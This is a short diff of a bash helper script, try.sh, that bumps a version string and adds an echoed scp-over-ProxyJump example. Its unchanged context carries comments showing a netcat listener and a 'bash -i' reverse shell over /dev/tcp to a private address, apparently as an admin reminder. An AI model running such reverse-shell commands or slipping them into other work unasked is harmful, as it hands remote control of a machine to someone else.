@@ -7,7 +7,7 @@ if [[ ${DEBUG-} =~ ^1|yes|true$ ]]; then
     export PS4='[\D{%FT%TZ}] ${BASH_SOURCE}:${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
     set -o xtrace
 fi
-VERSION+=("1d1a8f9[2021-12-28T15:03:10+08:00]:try.sh")
+VERSION+=("53957ab[2022-02-23T08:56:19+08:00]:try.sh")
 [ -e ${DIRNAME}/functions.sh ] && . ${DIRNAME}/functions.sh || true
 ##################################################
 cleanup() {
@@ -335,6 +335,7 @@ EOF
     # local<192.168.168.A>  run: nc -lp9999
     # remote<192.168.168.B> run: bash -i &> /dev/tcp/192.168.168.A/9999 0>&1
     echo ssh -p port user1@target -J user2@bridge:port
+    echo scp -o \"ProxyJump user1@Proxy\" File User@Destination:Path
     return 0
 }
 
